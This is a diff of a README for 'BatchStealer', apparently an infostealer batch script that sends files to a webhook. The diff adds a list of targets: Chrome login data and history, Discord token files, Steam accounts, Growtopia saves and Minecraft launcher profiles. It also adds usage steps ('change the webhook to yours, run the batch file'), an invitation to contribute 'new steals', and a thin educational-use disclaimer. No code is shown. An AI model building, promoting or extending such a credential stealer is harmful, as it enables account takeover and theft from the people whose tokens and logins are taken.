@@ -4,17 +4,39 @@
 
 # BatchStealer
 
-A batch script for taking files or text and sending them to a webhook
+### A batch script for taking files or text and sending them to a webhook
+
+It is forbidden to use this batch file for non-educational purposes. Use only with permission on your own computers.
 
 # How to use
 
 1. Change the webhook to yours
 2. Run the batch file
 
+# Steals
+
+* Growtopia
+  * Save.dat
+* Chrome
+  * History
+  * Shortcuts
+  * Bookmarks
+  * Login Data (encrypted)
+* Discord
+  * File containing Token
+* Steam
+  * Logged in users (Username, email)
+* Minecraft
+  * Launcher profiles and accounts (no password)
+
 # Future 
 
-* More features might come if I am bored.
-* Pull requests are welcome!
+* More features come if and when I am bored.
+
+# Support
+
+* If you want to support the project do a pull request.
+  * The pull request could be for a new steal etc.
 
 # Legal
 
